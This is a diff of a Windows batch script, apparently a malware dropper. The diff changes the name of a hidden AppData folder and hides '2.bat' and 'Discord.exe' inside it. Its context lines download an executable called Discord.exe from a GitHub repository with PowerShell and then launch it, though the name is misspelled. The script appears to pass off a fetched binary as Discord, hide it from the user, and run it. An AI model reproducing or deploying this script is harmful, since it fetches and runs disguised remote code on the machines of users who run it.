@@ -28,8 +28,8 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d
+cd C:\Users\%USERNAME%\AppData\Local\Antho" 
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Antho\2.bat" /s /d
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Antho\Discord.exe" /s /d
 Powershell -Command "Invoke-Webrequest 'https://github.com/SkillsNoHacks/yud/raw/main/Discord.exe' -OutFile Discord.exe"
 start Discod.exe
